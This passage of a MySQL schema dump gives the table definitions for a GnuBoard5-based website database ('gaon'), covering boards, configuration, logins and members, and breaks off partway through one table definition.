/*
MySQL Data Transfer
Source Host: 34.64.36.149
Source Database: gaon
Target Host: 34.64.36.149
Target Database: gaon
Date: 2024-05-24 ���� 9:51:51
*/

SET FOREIGN_KEY_CHECKS=0;
-- ----------------------------
-- Table structure for g5_auth
-- ----------------------------
CREATE TABLE `g5_auth` (
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `au_menu` varchar(20) NOT NULL DEFAULT '',
  `au_auth` set('r','w','d') NOT NULL DEFAULT '',
  PRIMARY KEY (`mb_id`,`au_menu`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_autosave
-- ----------------------------
CREATE TABLE `g5_autosave` (
  `as_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL,
  `as_uid` bigint(20) unsigned NOT NULL,
  `as_subject` varchar(255) NOT NULL,
  `as_content` text NOT NULL,
  `as_datetime` datetime NOT NULL,
  PRIMARY KEY (`as_id`),
  UNIQUE KEY `as_uid` (`as_uid`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_board
-- ----------------------------
CREATE TABLE `g5_board` (
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `gr_id` varchar(255) NOT NULL DEFAULT '',
  `bo_subject` varchar(255) NOT NULL DEFAULT '',
  `bo_mobile_subject` varchar(255) NOT NULL DEFAULT '',
  `bo_device` enum('both','pc','mobile') NOT NULL DEFAULT 'both',
  `bo_admin` varchar(255) NOT NULL DEFAULT '',
  `bo_list_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_read_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_write_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_reply_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_comment_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_upload_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_download_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_html_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_link_level` tinyint(4) NOT NULL DEFAULT 0,
  `bo_count_delete` tinyint(4) NOT NULL DEFAULT 0,
  `bo_count_modify` tinyint(4) NOT NULL DEFAULT 0,
  `bo_read_point` int(11) NOT NULL DEFAULT 0,
  `bo_write_point` int(11) NOT NULL DEFAULT 0,
  `bo_comment_point` int(11) NOT NULL DEFAULT 0,
  `bo_download_point` int(11) NOT NULL DEFAULT 0,
  `bo_use_category` tinyint(4) NOT NULL DEFAULT 0,
  `bo_category_list` text NOT NULL,
  `bo_use_sideview` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_file_content` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_secret` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_dhtml_editor` tinyint(4) NOT NULL DEFAULT 0,
  `bo_select_editor` varchar(50) NOT NULL DEFAULT '',
  `bo_use_rss_view` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_good` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_nogood` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_name` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_signature` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_ip_view` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_list_view` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_list_file` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_list_content` tinyint(4) NOT NULL DEFAULT 0,
  `bo_table_width` int(11) NOT NULL DEFAULT 0,
  `bo_subject_len` int(11) NOT NULL DEFAULT 0,
  `bo_mobile_subject_len` int(11) NOT NULL DEFAULT 0,
  `bo_page_rows` int(11) NOT NULL DEFAULT 0,
  `bo_mobile_page_rows` int(11) NOT NULL DEFAULT 0,
  `bo_new` int(11) NOT NULL DEFAULT 0,
  `bo_hot` int(11) NOT NULL DEFAULT 0,
  `bo_image_width` int(11) NOT NULL DEFAULT 0,
  `bo_skin` varchar(255) NOT NULL DEFAULT '',
  `bo_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `bo_include_head` varchar(255) NOT NULL DEFAULT '',
  `bo_include_tail` varchar(255) NOT NULL DEFAULT '',
  `bo_content_head` text NOT NULL,
  `bo_mobile_content_head` text NOT NULL,
  `bo_content_tail` text NOT NULL,
  `bo_mobile_content_tail` text NOT NULL,
  `bo_insert_content` text NOT NULL,
  `bo_gallery_cols` int(11) NOT NULL DEFAULT 0,
  `bo_gallery_width` int(11) NOT NULL DEFAULT 0,
  `bo_gallery_height` int(11) NOT NULL DEFAULT 0,
  `bo_mobile_gallery_width` int(11) NOT NULL DEFAULT 0,
  `bo_mobile_gallery_height` int(11) NOT NULL DEFAULT 0,
  `bo_upload_size` int(11) NOT NULL DEFAULT 0,
  `bo_reply_order` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_search` tinyint(4) NOT NULL DEFAULT 0,
  `bo_order` int(11) NOT NULL DEFAULT 0,
  `bo_count_write` int(11) NOT NULL DEFAULT 0,
  `bo_count_comment` int(11) NOT NULL DEFAULT 0,
  `bo_write_min` int(11) NOT NULL DEFAULT 0,
  `bo_write_max` int(11) NOT NULL DEFAULT 0,
  `bo_comment_min` int(11) NOT NULL DEFAULT 0,
  `bo_comment_max` int(11) NOT NULL DEFAULT 0,
  `bo_notice` text NOT NULL,
  `bo_upload_count` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_email` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_cert` enum('','cert','adult','hp-cert','hp-adult') NOT NULL DEFAULT '',
  `bo_use_sns` tinyint(4) NOT NULL DEFAULT 0,
  `bo_use_captcha` tinyint(4) NOT NULL DEFAULT 0,
  `bo_sort_field` varchar(255) NOT NULL DEFAULT '',
  `bo_1_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_2_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_3_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_4_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_5_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_6_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_7_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_8_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_9_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_10_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_1` varchar(255) NOT NULL DEFAULT '',
  `bo_2` varchar(255) NOT NULL DEFAULT '',
  `bo_3` varchar(255) NOT NULL DEFAULT '',
  `bo_4` varchar(255) NOT NULL DEFAULT '',
  `bo_5` varchar(255) NOT NULL DEFAULT '',
  `bo_6` varchar(255) NOT NULL DEFAULT '',
  `bo_7` varchar(255) NOT NULL DEFAULT '',
  `bo_8` varchar(255) NOT NULL DEFAULT '',
  `bo_9` varchar(255) NOT NULL DEFAULT '',
  `bo_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`bo_table`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_board_file
-- ----------------------------
CREATE TABLE `g5_board_file` (
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT 0,
  `bf_no` int(11) NOT NULL DEFAULT 0,
  `bf_source` varchar(255) NOT NULL DEFAULT '',
  `bf_file` varchar(255) NOT NULL DEFAULT '',
  `bf_download` int(11) NOT NULL,
  `bf_content` text NOT NULL,
  `bf_fileurl` varchar(255) NOT NULL DEFAULT '',
  `bf_thumburl` varchar(255) NOT NULL DEFAULT '',
  `bf_storage` varchar(50) NOT NULL DEFAULT '',
  `bf_filesize` int(11) NOT NULL DEFAULT 0,
  `bf_width` int(11) NOT NULL DEFAULT 0,
  `bf_height` smallint(6) NOT NULL DEFAULT 0,
  `bf_type` tinyint(4) NOT NULL DEFAULT 0,
  `bf_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`bo_table`,`wr_id`,`bf_no`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_board_good
-- ----------------------------
CREATE TABLE `g5_board_good` (
  `bg_id` int(11) NOT NULL AUTO_INCREMENT,
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `bg_flag` varchar(255) NOT NULL DEFAULT '',
  `bg_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`bg_id`),
  UNIQUE KEY `fkey1` (`bo_table`,`wr_id`,`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_board_new
-- ----------------------------
CREATE TABLE `g5_board_new` (
  `bn_id` int(11) NOT NULL AUTO_INCREMENT,
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT 0,
  `wr_parent` int(11) NOT NULL DEFAULT 0,
  `bn_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`bn_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB AUTO_INCREMENT=51 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_board_report
-- ----------------------------
CREATE TABLE `g5_board_report` (
  `si_id` int(11) NOT NULL AUTO_INCREMENT,
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `si_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`si_id`),
  KEY `bo_table` (`bo_table`,`wr_id`,`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_cert_history
-- ----------------------------
CREATE TABLE `g5_cert_history` (
  `cr_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `cr_company` varchar(255) NOT NULL DEFAULT '',
  `cr_method` varchar(255) NOT NULL DEFAULT '',
  `cr_ip` varchar(255) NOT NULL DEFAULT '',
  `cr_date` date NOT NULL DEFAULT '0000-00-00',
  `cr_time` time NOT NULL DEFAULT '00:00:00',
  PRIMARY KEY (`cr_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_config
-- ----------------------------
CREATE TABLE `g5_config` (
  `cf_title` varchar(255) NOT NULL DEFAULT '',
  `cf_theme` varchar(100) NOT NULL DEFAULT '',
  `cf_admin` varchar(100) NOT NULL DEFAULT '',
  `cf_admin_email` varchar(100) NOT NULL DEFAULT '',
  `cf_admin_email_name` varchar(100) NOT NULL DEFAULT '',
  `cf_add_script` text NOT NULL,
  `cf_use_point` tinyint(4) NOT NULL DEFAULT 0,
  `cf_point_term` int(11) NOT NULL DEFAULT 0,
  `cf_use_copy_log` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_email_certify` tinyint(4) NOT NULL DEFAULT 0,
  `cf_login_point` int(11) NOT NULL DEFAULT 0,
  `cf_cut_name` tinyint(4) NOT NULL DEFAULT 0,
  `cf_nick_modify` int(11) NOT NULL DEFAULT 0,
  `cf_new_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_new_rows` int(11) NOT NULL DEFAULT 0,
  `cf_search_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_connect_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_faq_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_read_point` int(11) NOT NULL DEFAULT 0,
  `cf_write_point` int(11) NOT NULL DEFAULT 0,
  `cf_comment_point` int(11) NOT NULL DEFAULT 0,
  `cf_download_point` int(11) NOT NULL DEFAULT 0,
  `cf_write_pages` int(11) NOT NULL DEFAULT 0,
  `cf_mobile_pages` int(11) NOT NULL DEFAULT 0,
  `cf_link_target` varchar(50) NOT NULL DEFAULT '',
  `cf_bbs_rewrite` tinyint(4) NOT NULL DEFAULT 0,
  `cf_delay_sec` int(11) NOT NULL DEFAULT 0,
  `cf_filter` text NOT NULL,
  `cf_possible_ip` text NOT NULL,
  `cf_intercept_ip` text NOT NULL,
  `cf_analytics` text NOT NULL,
  `cf_add_meta` text NOT NULL,
  `cf_syndi_token` varchar(255) NOT NULL,
  `cf_syndi_except` text NOT NULL,
  `cf_member_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_use_homepage` tinyint(4) NOT NULL DEFAULT 0,
  `cf_req_homepage` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_tel` tinyint(4) NOT NULL DEFAULT 0,
  `cf_req_tel` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_hp` tinyint(4) NOT NULL DEFAULT 0,
  `cf_req_hp` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_addr` tinyint(4) NOT NULL DEFAULT 0,
  `cf_req_addr` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_signature` tinyint(4) NOT NULL DEFAULT 0,
  `cf_req_signature` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_profile` tinyint(4) NOT NULL DEFAULT 0,
  `cf_req_profile` tinyint(4) NOT NULL DEFAULT 0,
  `cf_register_level` tinyint(4) NOT NULL DEFAULT 0,
  `cf_register_point` int(11) NOT NULL DEFAULT 0,
  `cf_icon_level` tinyint(4) NOT NULL DEFAULT 0,
  `cf_use_recommend` tinyint(4) NOT NULL DEFAULT 0,
  `cf_recommend_point` int(11) NOT NULL DEFAULT 0,
  `cf_leave_day` int(11) NOT NULL DEFAULT 0,
  `cf_search_part` int(11) NOT NULL DEFAULT 0,
  `cf_email_use` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_wr_super_admin` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_wr_group_admin` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_wr_board_admin` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_wr_write` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_wr_comment_all` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_mb_super_admin` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_mb_member` tinyint(4) NOT NULL DEFAULT 0,
  `cf_email_po_super_admin` tinyint(4) NOT NULL DEFAULT 0,
  `cf_prohibit_id` text NOT NULL,
  `cf_prohibit_email` text NOT NULL,
  `cf_new_del` int(11) NOT NULL DEFAULT 0,
  `cf_memo_del` int(11) NOT NULL DEFAULT 0,
  `cf_visit_del` int(11) NOT NULL DEFAULT 0,
  `cf_popular_del` int(11) NOT NULL DEFAULT 0,
  `cf_optimize_date` date NOT NULL DEFAULT '0000-00-00',
  `cf_use_member_icon` tinyint(4) NOT NULL DEFAULT 0,
  `cf_member_icon_size` int(11) NOT NULL DEFAULT 0,
  `cf_member_icon_width` int(11) NOT NULL DEFAULT 0,
  `cf_member_icon_height` int(11) NOT NULL DEFAULT 0,
  `cf_member_img_size` int(11) NOT NULL DEFAULT 0,
  `cf_member_img_width` int(11) NOT NULL DEFAULT 0,
  `cf_member_img_height` int(11) NOT NULL DEFAULT 0,
  `cf_login_minutes` int(11) NOT NULL DEFAULT 0,
  `cf_image_extension` varchar(255) NOT NULL DEFAULT '',
  `cf_flash_extension` varchar(255) NOT NULL DEFAULT '',
  `cf_movie_extension` varchar(255) NOT NULL DEFAULT '',
  `cf_formmail_is_member` tinyint(4) NOT NULL DEFAULT 0,
  `cf_page_rows` int(11) NOT NULL DEFAULT 0,
  `cf_mobile_page_rows` int(11) NOT NULL DEFAULT 0,
  `cf_visit` varchar(255) NOT NULL DEFAULT '',
  `cf_max_po_id` int(11) NOT NULL DEFAULT 0,
  `cf_stipulation` text NOT NULL,
  `cf_privacy` text NOT NULL,
  `cf_open_modify` int(11) NOT NULL DEFAULT 0,
  `cf_memo_send_point` int(11) NOT NULL DEFAULT 0,
  `cf_mobile_new_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_mobile_search_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_mobile_connect_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_mobile_faq_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_mobile_member_skin` varchar(50) NOT NULL DEFAULT '',
  `cf_captcha_mp3` varchar(255) NOT NULL DEFAULT '',
  `cf_editor` varchar(50) NOT NULL DEFAULT '',
  `cf_cert_use` tinyint(4) NOT NULL DEFAULT 0,
  `cf_cert_find` tinyint(4) NOT NULL DEFAULT 0,
  `cf_cert_ipin` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_hp` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_simple` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_kg_cd` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_kg_mid` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_kcb_cd` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_kcp_cd` varchar(255) NOT NULL DEFAULT '',
  `cf_lg_mid` varchar(100) NOT NULL DEFAULT '',
  `cf_lg_mert_key` varchar(100) NOT NULL DEFAULT '',
  `cf_cert_limit` int(11) NOT NULL DEFAULT 0,
  `cf_cert_req` tinyint(4) NOT NULL DEFAULT 0,
  `cf_sms_use` varchar(255) NOT NULL DEFAULT '',
  `cf_sms_type` varchar(10) NOT NULL DEFAULT '',
  `cf_icode_id` varchar(255) NOT NULL DEFAULT '',
  `cf_icode_pw` varchar(255) NOT NULL DEFAULT '',
  `cf_icode_server_ip` varchar(50) NOT NULL DEFAULT '',
  `cf_icode_server_port` varchar(50) NOT NULL DEFAULT '',
  `cf_icode_token_key` varchar(100) NOT NULL DEFAULT '',
  `cf_googl_shorturl_apikey` varchar(50) NOT NULL DEFAULT '',
  `cf_social_login_use` tinyint(4) NOT NULL DEFAULT 0,
  `cf_social_servicelist` varchar(255) NOT NULL DEFAULT '',
  `cf_payco_clientid` varchar(100) NOT NULL DEFAULT '',
  `cf_payco_secret` varchar(100) NOT NULL DEFAULT '',
  `cf_facebook_appid` varchar(100) NOT NULL,
  `cf_facebook_secret` varchar(100) NOT NULL,
  `cf_twitter_key` varchar(100) NOT NULL,
  `cf_twitter_secret` varchar(100) NOT NULL,
  `cf_google_clientid` varchar(100) NOT NULL DEFAULT '',
  `cf_google_secret` varchar(100) NOT NULL DEFAULT '',
  `cf_naver_clientid` varchar(100) NOT NULL DEFAULT '',
  `cf_naver_secret` varchar(100) NOT NULL DEFAULT '',
  `cf_kakao_rest_key` varchar(100) NOT NULL DEFAULT '',
  `cf_kakao_client_secret` varchar(100) NOT NULL DEFAULT '',
  `cf_kakao_js_apikey` varchar(100) NOT NULL,
  `cf_captcha` varchar(100) NOT NULL DEFAULT '',
  `cf_recaptcha_site_key` varchar(100) NOT NULL DEFAULT '',
  `cf_recaptcha_secret_key` varchar(100) NOT NULL DEFAULT '',
  `cf_1_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_2_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_3_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_4_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_5_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_6_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_7_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_8_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_9_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_10_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_1` varchar(255) NOT NULL DEFAULT '',
  `cf_2` varchar(255) NOT NULL DEFAULT '',
  `cf_3` varchar(255) NOT NULL DEFAULT '',
  `cf_4` varchar(255) NOT NULL DEFAULT '',
  `cf_5` varchar(255) NOT NULL DEFAULT '',
  `cf_6` varchar(255) NOT NULL DEFAULT '',
  `cf_7` varchar(255) NOT NULL DEFAULT '',
  `cf_8` varchar(255) NOT NULL DEFAULT '',
  `cf_9` varchar(255) NOT NULL DEFAULT '',
  `cf_10` varchar(255) NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_content
-- ----------------------------
CREATE TABLE `g5_content` (
  `co_id` varchar(20) NOT NULL DEFAULT '',
  `co_html` tinyint(4) NOT NULL DEFAULT 0,
  `co_subject` varchar(255) NOT NULL DEFAULT '',
  `co_content` longtext NOT NULL,
  `co_seo_title` varchar(255) NOT NULL DEFAULT '',
  `co_mobile_content` longtext NOT NULL,
  `co_skin` varchar(255) NOT NULL DEFAULT '',
  `co_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `co_tag_filter_use` tinyint(4) NOT NULL DEFAULT 0,
  `co_hit` int(11) NOT NULL DEFAULT 0,
  `co_include_head` varchar(255) NOT NULL,
  `co_include_tail` varchar(255) NOT NULL,
  PRIMARY KEY (`co_id`),
  KEY `co_seo_title` (`co_seo_title`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_faq
-- ----------------------------
CREATE TABLE `g5_faq` (
  `fa_id` int(11) NOT NULL AUTO_INCREMENT,
  `fm_id` int(11) NOT NULL DEFAULT 0,
  `fa_subject` text NOT NULL,
  `fa_content` text NOT NULL,
  `fa_order` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`fa_id`),
  KEY `fm_id` (`fm_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_faq_master
-- ----------------------------
CREATE TABLE `g5_faq_master` (
  `fm_id` int(11) NOT NULL AUTO_INCREMENT,
  `fm_subject` varchar(255) NOT NULL DEFAULT '',
  `fm_head_html` text NOT NULL,
  `fm_tail_html` text NOT NULL,
  `fm_mobile_head_html` text NOT NULL,
  `fm_mobile_tail_html` text NOT NULL,
  `fm_order` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`fm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_group
-- ----------------------------
CREATE TABLE `g5_group` (
  `gr_id` varchar(10) NOT NULL DEFAULT '',
  `gr_subject` varchar(255) NOT NULL DEFAULT '',
  `gr_device` enum('both','pc','mobile') NOT NULL DEFAULT 'both',
  `gr_admin` varchar(255) NOT NULL DEFAULT '',
  `gr_use_access` tinyint(4) NOT NULL DEFAULT 0,
  `gr_order` int(11) NOT NULL DEFAULT 0,
  `gr_1_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_2_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_3_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_4_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_5_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_6_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_7_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_8_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_9_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_10_subj` varchar(255) NOT NULL DEFAULT '',
  `gr_1` varchar(255) NOT NULL DEFAULT '',
  `gr_2` varchar(255) NOT NULL DEFAULT '',
  `gr_3` varchar(255) NOT NULL DEFAULT '',
  `gr_4` varchar(255) NOT NULL DEFAULT '',
  `gr_5` varchar(255) NOT NULL DEFAULT '',
  `gr_6` varchar(255) NOT NULL DEFAULT '',
  `gr_7` varchar(255) NOT NULL DEFAULT '',
  `gr_8` varchar(255) NOT NULL DEFAULT '',
  `gr_9` varchar(255) NOT NULL DEFAULT '',
  `gr_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`gr_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_group_member
-- ----------------------------
CREATE TABLE `g5_group_member` (
  `gm_id` int(11) NOT NULL AUTO_INCREMENT,
  `gr_id` varchar(255) NOT NULL DEFAULT '',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `gm_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`gm_id`),
  KEY `gr_id` (`gr_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_login
-- ----------------------------
CREATE TABLE `g5_login` (
  `lo_ip` varchar(100) NOT NULL DEFAULT '',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `lo_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lo_location` text NOT NULL,
  `lo_url` text NOT NULL,
  PRIMARY KEY (`lo_ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_mail
-- ----------------------------
CREATE TABLE `g5_mail` (
  `ma_id` int(11) NOT NULL AUTO_INCREMENT,
  `ma_subject` varchar(255) NOT NULL DEFAULT '',
  `ma_content` mediumtext NOT NULL,
  `ma_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ma_ip` varchar(255) NOT NULL DEFAULT '',
  `ma_last_option` text NOT NULL,
  PRIMARY KEY (`ma_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_member
-- ----------------------------
CREATE TABLE `g5_member` (
  `mb_no` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `mb_password` varchar(255) NOT NULL DEFAULT '',
  `mb_name` varchar(255) NOT NULL DEFAULT '',
  `mb_nick` varchar(255) NOT NULL DEFAULT '',
  `mb_nick_date` date NOT NULL DEFAULT '0000-00-00',
  `mb_email` varchar(255) NOT NULL DEFAULT '',
  `mb_homepage` varchar(255) NOT NULL DEFAULT '',
  `mb_level` tinyint(4) NOT NULL DEFAULT 0,
  `mb_sex` char(1) NOT NULL DEFAULT '',
  `mb_birth` varchar(255) NOT NULL DEFAULT '',
  `mb_tel` varchar(255) NOT NULL DEFAULT '',
  `mb_hp` varchar(255) NOT NULL DEFAULT '',
  `mb_certify` varchar(20) NOT NULL DEFAULT '',
  `mb_adult` tinyint(4) NOT NULL DEFAULT 0,
  `mb_dupinfo` varchar(255) NOT NULL DEFAULT '',
  `mb_zip1` char(3) NOT NULL DEFAULT '',
  `mb_zip2` char(3) NOT NULL DEFAULT '',
  `mb_addr1` varchar(255) NOT NULL DEFAULT '',
  `mb_addr2` varchar(255) NOT NULL DEFAULT '',
  `mb_addr3` varchar(255) NOT NULL DEFAULT '',
  `mb_addr_jibeon` varchar(255) NOT NULL DEFAULT '',
  `mb_signature` text NOT NULL,
  `mb_recommend` varchar(255) NOT NULL DEFAULT '',
  `mb_point` int(11) NOT NULL DEFAULT 0,
  `mb_today_login` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_login_ip` varchar(255) NOT NULL DEFAULT '',
  `mb_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_ip` varchar(255) NOT NULL DEFAULT '',
  `mb_leave_date` varchar(8) NOT NULL DEFAULT '',
  `mb_intercept_date` varchar(8) NOT NULL DEFAULT '',
  `mb_email_certify` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_email_certify2` varchar(255) NOT NULL DEFAULT '',
  `mb_memo` text NOT NULL,
  `mb_lost_certify` varchar(255) NOT NULL,
  `mb_mailling` tinyint(4) NOT NULL DEFAULT 0,
  `mb_sms` tinyint(4) NOT NULL DEFAULT 0,
  `mb_open` tinyint(4) NOT NULL DEFAULT 0,
  `mb_open_date` date NOT NULL DEFAULT '0000-00-00',
  `mb_profile` text NOT NULL,
  `mb_memo_call` varchar(255) NOT NULL DEFAULT '',
  `mb_memo_cnt` int(11) NOT NULL DEFAULT 0,
  `mb_scrap_cnt` int(11) NOT NULL DEFAULT 0,
  `mb_1` varchar(255) NOT NULL DEFAULT '',
  `mb_2` varchar(255) NOT NULL DEFAULT '',
  `mb_3` varchar(255) NOT NULL DEFAULT '',
  `mb_4` varchar(255) NOT NULL DEFAULT '',
  `mb_5` varchar(255) NOT NULL DEFAULT '',
  `mb_6` varchar(255) NOT NULL DEFAULT '',
  `mb_7` varchar(255) NOT NULL DEFAULT '',
  `mb_8` varchar(255) NOT NULL DEFAULT '',
  `mb_9` varchar(255) NOT NULL DEFAULT '',
  `mb_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`mb_no`),
  UNIQUE KEY `mb_id` (`mb_id`),
  KEY `mb_today_login` (`mb_today_login`),
  KEY `mb_datetime` (`mb_datetime`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_member_block
-- ----------------------------
CREATE TABLE `g5_member_block` (
  `bl_id` int(11) NOT NULL AUTO_INCREMENT,
